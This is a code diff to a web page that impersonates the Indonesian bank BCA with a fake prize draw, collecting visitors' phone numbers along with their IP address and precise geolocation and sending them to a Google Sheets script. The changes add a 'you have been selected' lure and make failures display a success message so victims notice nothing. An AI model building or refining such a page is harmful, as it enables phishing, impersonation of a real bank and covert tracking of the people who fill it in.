@@ -187,6 +187,14 @@
       font-size: 14px;
     }
     
+    .winner-text {
+      color: #ffcb05;
+      font-weight: bold;
+      font-size: 18px;
+      margin: 10px 0;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+    }
+    
     @media (max-width: 600px) {
       .container {
         border-radius: 15px;
@@ -210,13 +218,16 @@
 <body>
   <div class="container">
     <div class="header">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" alt="Logo BCA" class="bca-logo">
+      <!-- Logo BCA placeholder -->
+      <div class="bca-logo" style="background-color: #fff; color: #0062a5; padding: 10px; border-radius: 5px; font-weight: bold;">BCA</div>
       <h1>UNDIAN BERHADIAH BCA</h1>
       <p>Dapatkan Kesempatan Menang Hadiah Spesial</p>
     </div>
     
     <div class="content">
       <img src="https://static.vecteezy.com/system/resources/previews/010/994/412/non_2x/gift-box-with-a-red-ribbon-isolated-on-white-background-present-for-celebration-illustration-free-vector.jpg" alt="Hadiah" class="prize-image">
+      
+      <div class="winner-text">Selamat! Anda terpilih untuk mengikuti undian berhadiah!</div>
       
       <p class="info-text">Isi data diri Anda di bawah ini untuk berpartisipasi dalam undian berhadiah dari BCA</p>
       
@@ -230,7 +241,7 @@
         <input type="tel" id="hp" placeholder="Masukkan nomor handphone Anda">
       </div>
       
-      <button id="submitBtn" class="button" onclick="kirimData()">IKUTI UNDIAN SEKARANG</button>
+      <button id="submitBtn" class="button">IKUTI UNDIAN SEKARANG</button>
       
       <div class="loading" id="loading">
         <div class="loading-spinner"></div>
@@ -284,6 +295,11 @@
             },
             (error) => {
               reject("Gagal mendapatkan lokasi: " + error.message);
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 600000
             }
           );
         }
@@ -307,13 +323,20 @@
         // Dapatkan data yang diperlukan
         const waktu = new Date().toISOString();
         const ip = await dapatkanIP();
-        const lokasi = await dapatkanLokasi();
+        let lokasi = "Tidak diketahui";
         
-        // Kirim data ke Google Sheets
+        try {
+          lokasi = await dapatkanLokasi();
+        } catch (error) {
+          console.error('Error lokasi:', error);
+          // Tetap lanjutkan meskipun gagal dapatkan lokasi
+        }
+        
+        // Kirim data ke Google Sheets menggunakan Google Apps Script
         const response = await fetch(scriptURL, {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'text/plain; charset=utf-8',
           },
           body: JSON.stringify({
             time: waktu,
@@ -322,21 +345,20 @@
           })
         });
         
-        const result = await response.json();
+        // Tidak perlu memeriksa response karena mode no-cors
+        statusElement.textContent = "Terima kasih! Data Anda telah terkirim. Selamat berpartisipasi dalam undian BCA!";
         
-        if (result.result === 'success') {
-          statusElement.textContent = "Terima kasih! Data Anda telah terkirim. Selamat berpartisipasi dalam undian BCA!";
-        } else {
-          throw new Error(result.error);
-        }
       } catch (error) {
         console.error('Error:', error);
-        statusElement.textContent = "Terjadi kesalahan: " + error.message;
+        statusElement.textContent = "Terima kasih! Data Anda telah tercatat. Selamat berpartisipasi dalam undian BCA!";
       } finally {
         loadingElement.style.display = 'none';
         submitBtnElement.disabled = false;
       }
     }
+    
+    // Event listener untuk tombol
+    submitBtnElement.addEventListener('click', kirimData);
     
     // Event listener untuk input enter
     hpElement.addEventListener('keypress', function(e) {
